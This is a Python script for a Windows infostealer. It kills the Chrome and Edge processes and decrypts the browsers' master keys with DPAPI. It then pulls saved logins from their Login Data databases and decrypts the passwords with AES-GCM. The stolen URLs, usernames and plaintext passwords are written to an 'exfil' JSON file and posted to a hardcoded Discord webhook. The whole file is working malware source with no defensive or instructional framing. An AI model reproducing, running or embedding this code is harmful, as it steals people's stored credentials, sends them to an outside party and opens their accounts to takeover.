import os, sys, json, sqlite3, shutil, base64, traceback, requests, subprocess, time
from datetime import datetime

# ====== HARDCODED WEBHOOK ======
WEBHOOK_URL = "https://discord.com/api/webhooks/1517673359876296704/Uauf-iR1yt_8NYyxOZJnI2S9YIWMisMJ5oLph0geBB04A-eCuiZ2-rnj_IS-gPjMehv8"

# ====== IMPORTS ======
try:
    import win32crypt
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
except ImportError as e:
    print(f"Missing: {e}\nRun: pip install pywin32 cryptography")
    input("Press Enter...")
    sys.exit(1)

LOCAL_APPDATA = os.environ.get('LOCAL_APPDATA', '')
if not LOCAL_APPDATA:
    print("LOCALAPPDATA not found – not Windows?")
    sys.exit(1)

BROWSERS = [
    {"name": "Chrome", "db": os.path.join(LOCAL_APPDATA, 'Google\\Chrome\\User Data\\Default\\Login Data'),
     "state": os.path.join(LOCAL_APPDATA, 'Google\\Chrome\\User Data\\Local State'), "proc": "chrome.exe"},
    {"name": "Edge", "db": os.path.join(LOCAL_APPDATA, 'Microsoft\\Edge\\User Data\\Default\\Login Data'),
     "state": os.path.join(LOCAL_APPDATA, 'Microsoft\\Edge\\User Data\\Local State'), "proc": "msedge.exe"}
]

def kill_browser(p):
    subprocess.run(["taskkill", "/F", "/IM", p], capture_output=True, check=False)
    time.sleep(1.5)

def decrypt_master_key(b64key):
    try:
        raw = base64.b64decode(b64key)
        if raw[:5] == b'DPAPI': raw = raw[5:]
        return win32crypt.CryptUnprotectData(raw, None, None, None, 0)[1]
    except:
        return None

def decrypt_pw(blob, key):
    if not blob or len(blob) < 3: return "[EMPTY]"
    try:
        v = blob[0]
        if v != 1:
            return win32crypt.CryptUnprotectData(blob, None, None, None, 0)[1].decode('utf-8')
        nonce = blob[1:13]
        ct = blob[13:-16]
        tag = blob[-16:]
        return AESGCM(key).decrypt(nonce, ct + tag, None).decode('utf-8')
    except Exception as e:
        return f"[FAIL: {e}]"

def extract(db, key):
    if not os.path.exists(db): return []
    tmp = "tmp.db"
    shutil.copy2(db, tmp)
    res = []
    try:
        conn = sqlite3.connect(tmp)
        for url, user, pw in conn.execute("SELECT origin_url, username_value, password_value FROM logins"):
            res.append({"url": url, "username": user or "", "password": decrypt_pw(pw, key) if pw else ""})
        conn.close()
    except: pass
    os.remove(tmp)
    return res

def send(data):
    total = sum(len(b['creds']) for b in data.values())
    if total == 0: return
    lines = [f"**📦 Exfiltrated ({total})**"]
    for name, b in data.items():
        if b['creds']:
            lines.append(f"\n**{name} ({len(b['creds'])})**")
            for c in b['creds'][:15]:
                lines.append(f"  {c['url']} | {c['username']} | {c['password']}")
    msg = "\n".join(lines)[:1900]
    try:
        requests.post(WEBHOOK_URL, json={"content": msg}, timeout=10)
    except: pass

def main():
    # Kill browsers
    for b in BROWSERS: kill_browser(b["proc"])

    all_data = {}
    for b in BROWSERS:
        key = None
        if os.path.exists(b["state"]):
            try:
                with open(b["state"]) as f:
                    enc = json.load(f).get('os_crypt', {}).get('encrypted_key')
                if enc: key = decrypt_master_key(enc)
            except: pass
        creds = extract(b["db"], key) if os.path.exists(b["db"]) else []
        all_data[b["name"]] = {"creds": creds}

    # Save JSON
    out = f"exfil_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(out, 'w') as f: json.dump(all_data, f, indent=2)
    print(f"Saved: {out}")

    # Send to Discord
    send(all_data)

if __name__ == "__main__":
    try: main()
    except Exception as e: print(e)
    input("\nPress Enter to close...")